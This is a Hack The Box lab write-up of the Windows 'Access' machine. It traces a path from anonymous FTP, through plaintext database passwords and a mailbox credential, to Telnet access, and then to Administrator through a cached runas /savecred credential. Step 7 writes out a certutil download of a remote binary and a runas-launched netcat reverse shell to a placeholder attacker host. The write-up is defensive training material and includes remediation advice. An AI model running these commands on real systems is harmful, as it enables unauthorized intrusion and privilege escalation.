---
title: "Access — Credential Sprawl Across Legacy Services"
description: "Anonymous FTP and archive recovery expose credentials that grant Telnet access, then escalate through cached credential abuse."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - credential-abuse
  - legacy-services
  - ftp
  - telnet
  - credential-manager
objective: "Escalate from anonymously exposed legacy services to administrative control without exploiting a single CVE."
tools:
  - nmap
  - ftp
  - mdbtools
  - 7z
  - pst-utils
  - telnet
  - netcat
  - cmdkey
  - certutil
  - runas
skill: "Credential discovery and abuse across legacy Windows services"
outcome: "Telnet user access and Administrator command execution via cached runas /savecred credentials"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows Server 2008 R2 (build 6.1.7600, end-of-life) |
| Starting position | Unauthenticated network access |
| Objective | Escalate from anonymously exposed legacy services to administrative control without exploiting a single CVE |
| Outcome | User-level Telnet shell; Administrator command execution via cached credentials |

## Credential sprawl across legacy services

Access is an Easy-rated Hack The Box Windows lab that reaches full administrative compromise without exploiting a single CVE by chaining misconfigured legacy services and stored credentials. Anonymous FTP exposes a Microsoft Access database and an encrypted ZIP archive; the database holds the archive password, the archive contains a mailbox that discloses Telnet credentials, and a cached `runas /savecred` credential turns a low-privileged shell into Administrator execution. Credential values, target and attacker addresses, and download locations are replaced with role-based placeholders; command syntax is preserved.

**Attack path:** **Anonymous FTP → database credential recovery → encrypted archive → mailbox credential disclosure → Telnet access → cached `runas /savecred` abuse → Administrator**

## End-of-life target, exposed services, and anonymous start

- **Target:** Windows Server 2008 R2, build 6.1.7600 — an end-of-life host outside Microsoft support.
- **Exposed services:** FTP (21), Telnet (23), and HTTP/IIS 7.5 (80).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from anonymous legacy-service access to user and administrative control, and demonstrate the impact of credential sprawl across those services.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: anonymous FTP to cached credential abuse

### 1. Service Enumeration

Observation: a full TCP scan exposes three services with distinct attack surfaces.

```bash
nmap -sT -p- --min-rate 5000 -oA <OUT_PREFIX> <TARGET_IP>
nmap -sC -sV -p 21,23,80 -oA <OUT_PREFIX> <TARGET_IP>
```

Truncated scan output:

```text
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
23/tcp open  telnet  Microsoft Windows XP telnetd
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
```

Significance: anonymous FTP is immediately actionable; Telnet is the only interactive shell service, so any recovered credential becomes directly usable; the leaked build (6.1.7600) identifies an end-of-life host.

Result: FTP, Telnet, and IIS are exposed on an out-of-support Windows host, and anonymous FTP access is confirmed.

### 2. Anonymous FTP Access

Observation: the FTP service allows anonymous login and exposes two directories with one sensitive file each.

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: (any string / blank)
ftp> type binary
ftp> get backup.mdb
ftp> get "Access Control.zip"
```

Directory listing:

```text
Backups/:
08-23-18  09:16PM      5652480  backup.mdb

Engineer/:
08-24-18  01:16AM        10870  Access Control.zip
```

Significance: both files are retrievable without authentication. `backup.mdb` is a Microsoft Access database; `Access Control.zip` is password-protected.

Result: the session yields a database and an encrypted archive for offline analysis.

### 3. Database Credential Recovery

Observation: `backup.mdb` is a Microsoft Jet 4.0 database; the `mdbtools` suite reads it on Linux without Microsoft Office.

```bash
mdb-tables backup.mdb
for table in $(mdb-tables backup.mdb); do mdb-count backup.mdb "$table"; done
mdb-export backup.mdb auth_user
```

The `auth_user` export returns three rows (identifiers and passwords redacted):

```text
id,username,password,Status,last_login,RoleID,Remark
25,<LAB_USER_1>,<PASSWORD_1>,1,"08/23/18 21:11:47",26,
27,<LAB_USER_2>,<PASSWORD_2>,1,"08/23/18 21:13:36",26,
28,<LAB_USER_3>,<PASSWORD_1>,1,"08/23/18 21:14:02",26,
```

Significance: the table stores account passwords in plaintext. One of those values unlocks the archive in the next stage, so the same secret crosses from the database into the encrypted archive.

Result: three stored credential pairs are recovered; one is reused successfully against the archive.

### 4. Archive Extraction and Mailbox Forensics

Observation: the ZIP unlocks with a database-derived password and contains an Outlook Personal Storage Table (`.pst`).

```bash
7z x "Access Control.zip"
# password prompt -> <ARCHIVE_PASSWORD> (database-derived, redacted)
readpst -D -r "Access Control.pst"
cat "Access Control.mbox"
```

The converted mailbox discloses a credential pair (password redacted):

```text
From: <SENDER>@<MAIL_DOMAIN>
To: <RECIPIENT>@<MAIL_DOMAIN>
Subject: MegaCorp Access Control System account

The password for the <LAB_USER> account has been changed to <LAB_USER_PASSWORD>.
```

Significance: exported mail is a common home for credential disclosures; converting the PST to mbox makes message bodies searchable, and this one yields credentials for the exposed Telnet service.

Result: the archive is unlocked with the database-derived password, and the mailbox yields a low-privileged credential pair that is subsequently validated through Telnet. Some `unzip` builds may not handle this compression method; `7z` does.

### 5. Telnet Initial Access

Observation: Telnet is the only interactive shell service, and the recovered credential fits it directly.

```bash
telnet <TARGET_IP>
# login:    <LAB_USER>
# password: <LAB_USER_PASSWORD>
```

Authentication returns a shell:

```text
Welcome to Microsoft Telnet Server.
C:\Users\<LAB_USER>>
```

Significance: Telnet carries credentials and session data in cleartext. The shell lacks support for certain control sequences and is unstable, so upgrading to a PowerShell-based reverse shell served over HTTP is presented as the next step; it is a recommendation, not an action the evidence shows performed.

Result: an authenticated user-level shell is obtained on the target.

### 6. Post-Exploitation Enumeration — Cached Credential Discovery

Observation: a security-application shortcut on the Public desktop points to `runas.exe`.

```cmd
dir C:\Users\Public\Desktop\
# ZKAccess3.5 Security System.lnk   1,870 bytes
```

```powershell
$WScript = New-Object -ComObject WScript.Shell
$SC = Get-Item "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk"
$WScript.CreateShortcut($SC)
```

The shortcut resolves to a saved-credential invocation:

```text
TargetPath  : C:\Windows\System32\runas.exe
Arguments   : /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

The credential store confirms the cache:

```cmd
cmdkey /list
```

```text
Currently stored credentials:

  Target: Domain:interactive=<DOMAIN>\<ADMIN_ACCOUNT>
  Type: Domain Password
  User: <DOMAIN>\<ADMIN_ACCOUNT>
```

Significance: `/savecred` causes Windows to cache the credential in Credential Manager after a first successful use, so later `runas /savecred` calls as the same user run without a password prompt. Any process in that user's context can reuse the entry until it is removed.

Result: a saved credential entry exists for the administrative account, confirming the shortcut was used previously.

### 7. Privilege Escalation — Cached Credential Abuse

Observation: a cached Administrator credential plus the ability to run commands as the low-privileged user completes the path.

Action, shown as placeholder patterns (download specifics summarized, not literal):

```cmd
certutil -urlcache -split -f <REMOTE_BINARY> <LOCAL_STAGING_PATH>
```

```bash
nc -lvnp <LISTEN_PORT>
```

```cmd
runas /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "<LOCAL_STAGING_PATH> -e cmd.exe <ATTACKER_HOST> <LISTEN_PORT>"
```

The shell returns in the Administrator context:

```text
connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>] <SOURCE_PORT>
Microsoft Windows [Version 6.1.7600]
C:\Windows\system32>whoami
<DOMAIN>\<ADMIN_ACCOUNT>
```

Significance: the cached credential lets any same-user process execute as Administrator without the password, turning a stale saved credential into full command execution.

Result: the privileged `whoami` output confirms execution in the Administrator context.

## An unstable Telnet shell and no CVE to exploit

| Challenge | Decision | Rationale |
|---|---|---|
| Telnet shell lacks control sequences and is unstable | Upgrade to a PowerShell-based reverse shell over HTTP is recommended | More stable interactive session |
| No single CVE to exploit | Followed the data and credential chain | Misconfigured legitimate services provided access without patch circumvention |

## Outcome: Telnet user shell and Administrator execution

The evidence establishes user-level access over Telnet using credentials recovered from anonymously reachable FTP data, and administrative command execution through a credential cached by `runas /savecred` — the privileged `whoami` output confirms the escalated context. HTTP was enumeration-only.

## Recommendations: anonymous FTP, plaintext secrets, Telnet, and cached credentials

The actions below are recommendations; none was validated in the lab.

Each finding below pairs the observed root cause with its demonstrated impact and a prioritized action.

1. **Anonymous FTP exposure.** Anonymous access let an unauthenticated party retrieve a database and an archived mailbox. *Recommendation:* require authentication, keep credential-bearing exports out of reachable directories, and replace FTP with an encrypted protocol such as SFTP. *Detection:* alert on anonymous FTP logins and on transfers of backup or export artifacts.
2. **Plaintext credentials in stored data.** The Access database stored passwords in cleartext and a mail archive disclosed another credential, enabling the archive unlock and the Telnet login. *Recommendation:* never store reusable credentials in databases or mailbox archives, and scan exports and backups for secrets before sharing them.
3. **Cleartext Telnet.** Telnet transmits credentials and session data in cleartext, so a recovered credential immediately yields a usable shell. *Recommendation:* retire Telnet in favor of SSH and disable the legacy service.
4. **Cached privileged credentials.** A `runas /savecred` entry persisted in Credential Manager, letting same-user processes run as Administrator without the password. *Recommendation:* audit and clear stored credentials with `cmdkey`, and disable saved-credential storage through Group Policy (`Network access: Do not allow storage of passwords and credentials for network authentication`). *Detection:* treat `runas /savecred` use with privileged accounts as a finding to investigate.

## References

- [Hack The Box — Access](https://app.hackthebox.com/machines/Access) (retired machine)
- [Windows Server 2008 R2 — Microsoft Lifecycle](https://learn.microsoft.com/en-us/lifecycle/products/windows-server-2008-r2)
- [telnet — Windows Commands (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/telnet)
- [Network access: Do not allow storage of passwords and credentials for network authentication (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-storage-of-passwords-and-credentials-for-network-authentication)
- [runas — Windows Commands (Microsoft Learn)](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)>)
- [cmdkey — Windows Commands (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
- [MDB Tools (`mdbtools`)](https://github.com/mdbtools/mdbtools)
- [libpst — `readpst`](https://www.five-ten-sg.com/libpst/)
- [7-Zip](https://7-zip.org/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
